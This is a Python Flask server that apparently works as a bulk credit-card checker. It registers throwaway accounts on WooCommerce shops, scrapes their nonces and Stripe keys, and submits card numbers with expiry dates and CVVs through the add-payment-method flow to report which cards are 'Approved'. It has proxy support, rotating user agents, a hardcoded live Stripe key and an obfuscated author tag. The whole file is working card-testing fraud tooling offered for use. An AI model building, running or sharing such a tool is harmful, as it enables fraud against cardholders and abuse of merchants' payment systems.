import sys
import os
import asyncio
import json
import re
import random
import base64
import uuid
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
import aiohttp
from fake_useragent import UserAgent
from colorama import init, Fore, Style

init(autoreset=True)

app = Flask(__name__)
CORS(app)

_0x4f2b = base64.b64decode('QG11bWlydV9icm8=').decode()

def parse_card_data(card_string):
    try:
        card_string = card_string.replace(' ', '')
        if '|' in card_string:
            parts = card_string.split('|')
            if len(parts) >= 4:
                return {
                    'number': parts[0],
                    'exp_month': parts[1],
                    'exp_year': parts[2][-2:] if len(parts[2]) == 4 else parts[2],
                    'cvc': parts[3].strip()
                }
        elif ':' in card_string:
            parts = card_string.split(':')
            if len(parts) >= 4:
                return {
                    'number': parts[0],
                    'exp_month': parts[1],
                    'exp_year': parts[2][-2:] if len(parts[2]) == 4 else parts[2],
                    'cvc': parts[3].strip()
                }
        return None
    except:
        return None

def generate_random_email():
    username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com', 'icloud.com']
    return f"{username}{number}@{random.choice(domains)}"

def generate_guid():
    return str(uuid.uuid4())

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except (ValueError, AttributeError):
        return None

async def process_stripe_card(base_url, card_data, proxy_url=None, auth_mode=1, shared_email=None, shared_password=None):
    ua = UserAgent()
    
    try:
        if not base_url.startswith(('http://', 'https://')):
            base_url = 'https://' + base_url
        
        base_url = base_url.rstrip('/')
        if '/my-account' not in base_url.lower():
            base_url += '/my-account'
        
        timeout = aiohttp.ClientTimeout(total=70)
        connector = aiohttp.TCPConnector(ssl=False)
        
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            from urllib.parse import urlparse
            parsed = urlparse(base_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            email = generate_random_email()
            
            if auth_mode == 1:
                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'user-agent': ua.random,
                }
                
                resp = await session.get(base_url, headers=headers, proxy=proxy_url)
                resp_text = await resp.text()
                
                register_nonce = (
                    gets(resp_text, 'woocommerce-register-nonce" value="', '"') or
                    gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or
                    gets(resp_text, 'name="woocommerce-register-nonce" value="', '"')
                )
                
                if register_nonce:
                    username = email.split('@')[0]
                    password = f"Pass{random.randint(100000, 999999)}!"
                    
                    register_data = {
                        'email': email,
                        'wc_order_attribution_source_type': 'typein',
                        'wc_order_attribution_referrer': '(none)',
                        'wc_order_attribution_utm_campaign': '(none)',
                        'wc_order_attribution_utm_source': '(direct)',
                        'wc_order_attribution_utm_medium': '(none)',
                        'wc_order_attribution_utm_content': '(none)',
                        'wc_order_attribution_utm_id': '(none)',
                        'wc_order_attribution_utm_term': '(none)',
                        'wc_order_attribution_utm_source_platform': '(none)',
                        'wc_order_attribution_utm_creative_format': '(none)',
                        'wc_order_attribution_utm_marketing_tactic': '(none)',
                        'wc_order_attribution_session_entry': base_url,
                        'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'wc_order_attribution_session_pages': '1',
                        'wc_order_attribution_session_count': '1',
                        'wc_order_attribution_user_agent': headers['user-agent'],
                        'woocommerce-register-nonce': register_nonce,
                        '_wp_http_referer': '/my-account/',
                        'register': 'Register',
                    }
                    
                    reg_resp = await session.post(base_url, headers=headers, data=register_data, proxy=proxy_url)
                    reg_text = await reg_resp.text()
                    
                    if 'customer-logout' not in reg_text and 'dashboard' not in reg_text.lower():
                        resp = await session.get(base_url, headers=headers, proxy=proxy_url)
                        resp_text = await resp.text()
                        login_nonce = gets(resp_text, 'woocommerce-login-nonce" value="', '"')
                        if login_nonce:
                            login_data = {'username': username, 'password': password, 'woocommerce-login-nonce': login_nonce, 'login': 'Log in'}
                            await session.post(base_url, headers=headers, data=login_data, proxy=proxy_url)
            
            add_payment_url = f"{domain}/my-account/add-payment-method/"
            headers = {'user-agent': ua.random}
            resp = await session.get(add_payment_url, headers=headers, proxy=proxy_url)
            payment_page_text = await resp.text()
            
            add_card_nonce = (
                gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or
                gets(payment_page_text, 'add_card_nonce":"', '"') or
                gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or
                gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"')
            )
            
            stripe_key = (
                gets(payment_page_text, '"key":"pk_', '"') or
                gets(payment_page_text, 'data-key="pk_', '"') or
                gets(payment_page_text, 'stripe_key":"pk_', '"') or
                gets(payment_page_text, 'publishable_key":"pk_', '"')
            )
            
            if not stripe_key:
                pk_match = re.search(r'pk_(live|test)_[a-zA-Z0-9]{24,}', payment_page_text)
                if pk_match:
                    stripe_key = pk_match.group(0)
            
            if not stripe_key:
                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
            
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua.random
            }
            
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'allow_redisplay': 'unspecified',
                'billing_details[address][country]': 'AU',
                'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
                'referrer': domain,
                'client_attribution_metadata[client_session_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': generate_guid(),
                'muid': generate_guid(),
                'sid': generate_guid(),
                'key': stripe_key,
                '_stripe_version': '2024-06-20',
            }
            
            pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy_url)
            pm_json = await pm_resp.json()
            
            if 'error' in pm_json:
                return False, pm_json['error']['message']
            
            pm_id = pm_json.get('id')
            if not pm_id:
                return False, "Failed to create Payment Method"
            
            confirm_headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': domain,
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': ua.random
            }
            
            endpoints = [
                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 'data': {'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/?wc-ajax=add_payment_method", 'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}},
            ]
            
            for endp in endpoints:
                if not add_card_nonce:
                    continue
                
                if 'add_payment_method' in endp['url']:
                    endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
                else:
                    endp['data']['_ajax_nonce'] = add_card_nonce
                
                endp['data']['wc-stripe-payment-type'] = 'card'
                
                try:
                    res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers, proxy=proxy_url)
                    text = await res.text()
                    
                    if 'success' in text:
                        js = json.loads(text)
                        if js.get('success'):
                            status = js.get('data', {}).get('status')
                            if status == 'succeeded':
                                return True, f"Approved (Status: succeeded) [By {_0x4f2b}]"
                            return True, f"Approved (Status: {status}) [By {_0x4f2b}]"
                        else:
                            error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
                            return False, f"{error_msg} [By {_0x4f2b}]"
                except:
                    continue
            
            return False, "Failed to confirm payment method on site"
    
    except Exception as e:
        return False, f"System Error: {str(e)}"

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'running', 'author': _0x4f2b})

@app.route('/check/single', methods=['POST'])
async def check_single():
    try:
        data = request.get_json()
        
        site = data.get('site')
        card = data.get('card')
        
        if not site or not card:
            return jsonify({'error': 'Missing site or card', 'status': False}), 400
        
        card_data = parse_card_data(card)
        if not card_data:
            return jsonify({'error': 'Invalid card format. Use NUM|MM|YY|CVV or NUM:MM:YY:CVV', 'status': False}), 400
        
        site = site.rstrip('/')
        if '/my-account' not in site.lower():
            site += '/my-account'
        
        is_approved, msg = await process_stripe_card(site, card_data)
        
        return jsonify({
            'card': card,
            'site': site,
            'approved': is_approved,
            'message': msg,
            'author': _0x4f2b
        })
    
    except Exception as e:
        return jsonify({'error': str(e), 'status': False}), 500

@app.route('/check/bulk', methods=['POST'])
async def check_bulk():
    try:
        data = request.get_json()
        
        site = data.get('site')
        cards = data.get('cards', [])
        
        if not site or not cards:
            return jsonify({'error': 'Missing site or cards list', 'status': False}), 400
        
        if isinstance(cards, str):
            cards = [c.strip() for c in cards.split('\n') if c.strip()]
        
        site = site.rstrip('/')
        if '/my-account' not in site.lower():
            site += '/my-account'
        
        results = []
        for card in cards:
            if not card:
                continue
            
            card_data = parse_card_data(card)
            if not card_data:
                results.append({'card': card, 'approved': False, 'message': 'Invalid format'})
                continue
            
            is_approved, msg = await process_stripe_card(site, card_data)
            results.append({'card': card, 'approved': is_approved, 'message': msg})
        
        approved_list = [r for r in results if r['approved']]
        declined_list = [r for r in results if not r['approved']]
        
        return jsonify({
            'site': site,
            'total': len(results),
            'approved_count': len(approved_list),
            'declined_count': len(declined_list),
            'approved': approved_list,
            'declined': declined_list,
            'author': _0x4f2b
        })
    
    except Exception as e:
        return jsonify({'error': str(e), 'status': False}), 500

if __name__ == '__main__':
    print(Fore.RED + """
╔═══════════════════════════════════════════════════════╗
║     STRIPE AUTH API - FLASK SERVER                    ║
║     Built by @mumiru_bro                              ║
║     NEUTRONNNN_KILLER MODE ACTIVE 😈🔥                ║
╚═══════════════════════════════════════════════════════╝
    """ + Fore.RESET)
    
    print(f"{Fore.CYAN}[*] Starting API Server...")
    print(f"{Fore.CYAN}[*] Endpoints:")
    print(f"{Fore.GREEN}    POST /check/single - Check single card")
    print(f"{Fore.GREEN}    POST /check/bulk  - Check multiple cards")
    print(f"{Fore.GREEN}    GET  /health      - Server status")
    print(f"{Fore.YELLOW}[*] API Running on http://0.0.0.0:5000")
    
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
